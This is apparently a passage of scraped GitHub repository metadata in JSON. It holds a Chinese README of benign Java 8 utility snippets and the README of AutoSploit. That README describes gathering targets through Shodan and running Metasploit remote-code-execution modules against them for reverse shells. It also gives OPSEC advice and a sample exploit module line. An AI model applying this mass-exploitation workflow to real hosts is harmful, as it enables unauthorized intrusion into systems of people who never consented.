words\n\n将给定的字符串转换为单词数组。\n\n```Java\npublic static String[] words(String input) {\n    return Arrays.stream(input.split(\"[^a-zA-Z-]+\"))\n            .filter(s -> !s.isEmpty())\n            .toArray(String[]::new);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### stringToIntegers\n\n将由空格分隔的数字字符串转换为 int 数组。\n\n```Java\npublic static int[] stringToIntegers(String numbers) {\n        return Arrays.stream(numbers.split(\" \")).mapToInt(Integer::parseInt).toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## IO\n\n### convertInputStreamToString\n\n将InputStream转换为字符串。\n\n```java\npublic static String convertInputStreamToString(final InputStream in) throws IOException {\n    ByteArrayOutputStream result = new ByteArrayOutputStream();\n    byte[] buffer = new byte[1024];\n    int length;\n    while ((length = in.read(buffer)) != -1) {\n        result.write(buffer, 0, length);\n    }\n    return result.toString(StandardCharsets.UTF_8.name());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### readFileAsString\n\n将文件内容读入字符串。\n\n```java\npublic String readFileAsString(Path path) throws IOException {\n    return new String(Files.readAllBytes(path));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### getCurrentWorkingDirectoryPath\n\n获取当前工作目录。\n\n```java\npublic static String getCurrentWorkingDirectoryPath() {\n    return FileSystems.getDefault().getPath(\"\").toAbsolutePath().toString();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### tmpDirName\n\n返回 `java.io.tmpdir` 系统属性的值。如果末尾没有分隔符，则追加分隔符。\n\n```java\npublic static String tmpDirName() {\n    String tmpDirName = System.getProperty(\"java.io.tmpdir\");\n    if (!tmpDirName.endsWith(File.separator)) {\n        tmpDirName += File.separator;\n    }\n\n    return tmpDirName;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## Exception\n\n### stackTraceAsString\n\n将异常堆栈跟踪转换为字符串。\n\n```java\npublic static String stackTraceAsString(final Throwable throwable) {\n    final StringWriter sw = new StringWriter();\n    throwable.printStackTrace(new PrintWriter(sw));\n    return sw.toString();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## System\n\n### osName\n\n以小写字符串的形式获取操作系统的名称。\n\n```java\npublic static String osName() {\n    return System.getProperty(\"os.name\").toLowerCase();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isDebuggerEnabled\n\n检查JVM是否为debug模式。\n\n```java\npublic static boolean isDebuggerAttached() {\n    final RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();\n    return runtimeMXBean.getInputArguments()\n            .stream()\n            .anyMatch(arg -> arg.contains(\"-agentlib:jdwp\"));\n\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## Class\n\n### getAllInterfaces\n\n此方法返回由给定类及其超类实现的所有接口。\n\n该方法通过连接两个Stream来工作。第一个Stream是通过创建带有接口的流和接口实现的所有接口来递归构建的。\n第二个Stream对超类也是如此。其结果是删除重复项后将两个Stream连接起来。\n\n```java\npublic static List<Class<?>> getAllInterfaces(Class<?> cls) {\n    return Stream.concat(\n            Arrays.stream(cls.getInterfaces()).flatMap(intf ->\n                    Stream.concat(Stream.of(intf), getAllInterfaces(intf).stream())),\n            cls.getSuperclass() == null ? Stream.empty() : getAllInterfaces(cls.getSuperclass()).stream()\n    ).distinct().collect(Collectors.toList());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isInnerClass\n\n此方法检查指定的类是内部类还是静态嵌套类。\n\n```Java\npublic static boolean isInnerClass(final Class<?> cls) {\n    return cls != null && cls.getEnclosingClass() != null;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## Enum\n\n### getEnumMap\n\n将枚举转换为 Map，其中 key 是枚举名，value 是枚举本身。\n\n```java\npublic static <E extends Enum<E>> Map<String, E> getEnumMap(final Class<E> enumClass) {\n    return Arrays.stream(enumClass.getEnumConstants())\n            .collect(Collectors.toMap(Enum::name, Function.identity()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)","byteSize":36326},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":945},"createdAt":"2018-01-30T13:02:27Z","updatedAt":"2018-02-14T14:02:11Z","pushedAt":"2018-01-30T14:36:40Z","description":"🎱 30 seconds to collect useful Java8 snippet","subscribersCount":{"totalCount":43},"diskUsage":100,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":14}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"NullArray","followers":{"totalCount":557},"repositories":{"totalCount":26},"following":{"totalCount":123},"location":"127.0.0.1","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":"https://twitter.com/Real__Vector"},"repository":{"name":"AutoSploit","primaryLanguage":{"name":"Python"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":623,"readme_md":{"text":"# AutoSploit\n\nAs the name might suggest AutoSploit attempts to automate the exploitation of remote hosts. Targets are collected automatically as well by employing the Shodan.io API. The program allows the user to enter their platform specific search query such as; `Apache`, `IIS`, etc, upon which a list of candidates will be retrieved.                           \n\nAfter this operation has been completed the 'Exploit' component of the program will go about the business of attempting to exploit these targets by running a series of Metasploit modules against them. Which Metasploit modules will be employed in this manner is determined by programmatically comparing the name of the module to the initial search query. However, I have added functionality to run all available modules against the targets in a 'Hail Mary' type of attack as well.\n\nThe available Metasploit modules have been selected to facilitate Remote Code Execution and to attempt to gain Reverse TCP Shells and/or Meterpreter sessions. Workspace, local host and local port for MSF facilitated back connections are configured through the dialog that comes up before the 'Exploit' component is started.\n\n**Operational Security Consideration**\n\nReceiving back connections on your local machine might not be the best idea from an OPSEC standpoint. Instead consider running this tool from a VPS that has all the dependencies required, available.\n\n## Usage\n\nClone the repo. Or deploy via Docker. Details for which can be found [here](https://github.com/NullArray/AutoSploit/tree/master/Docker) Special thanks to [Khast3x](https://github.com/khast3x) for their contribution in this regard.\n\n`git clone https://github.com/NullArray/AutoSploit.git`\n\nAfter which it can be started from the terminal with `python autosploit.py`. After which you can select one of five actions. Please see the option summary below.\n```\n+------------------+----------------------------------------------------+\n|     Option       |                   Summary                          |\n+------------------+----------------------------------------------------+\n|1. Usage          | Display this informational message.                |\n|2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  |\n|3. View Hosts     | Print gathered IPs/RHOSTS.                         |\n|4. Exploit        | Configure MSF and Start exploiting gathered targets|\n|5. Quit           | Exits AutoSploit.                                  |\n+------------------+----------------------------------------------------+\n```\n## Available Modules\nThe Metasploit modules available with this tool are selected for RCE. You can find them in the `modules.txt` file that is included in this repo. Should you wish to add more or other modules please do so in the following format.\n```\nuse exploit/linux/http/netgear_wnr2000_rce;exploit -j; \n```\nWith each new module on it's own line.\n\n## Dependencies\nAutoSploit depends on the following Python2.7 modules.\n```\nshodan\nblessings\n```\nShould you find you do not have these installed get them with pip like so.\n```\npip install shodan\npip install blessings\n```\nSince the program invokes functionality from the Metasploit Framework you need to have this installed also. \nGet it from Rapid7 by clicking [here](https://www.rapid7.com/products/metasploit/).\n\n### Note\nWhile this isn't exactly a Beta release it is an early release nonetheless as such the tool might be subject to changes in the future. If you happen to encounter a bug or would like to contribute to the tool's improvement please feel free to [Open a Ticket](https://github.com/NullArray/AutoSploit/issues) or [Submit a Pull Request](https://github.com/NullArray/AutoSploit/pulls)\n\nThanks.\n\n\n","byteSize":3714},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":2512},"createdAt":"2018-01-30T17:47:18Z","updatedAt":"2018-02-17T08:31:00Z","pushedAt":"2018-02-16T20:52:27Z","description":"Automated Mass Exploiter","subscribersCount":{"totalCount":177},"diskUsage":82,"pullRequestsOpen":{"totalCount":6},"pullRequestsClosed":{"totalCount":13},"pullRequestsMerged":{"totalCount":12},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":6},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":5},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":7},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":12},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":14}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":13},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":18},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":8},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":3},"numCommits":{"target":{"history":{"totalCount":38}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"}]
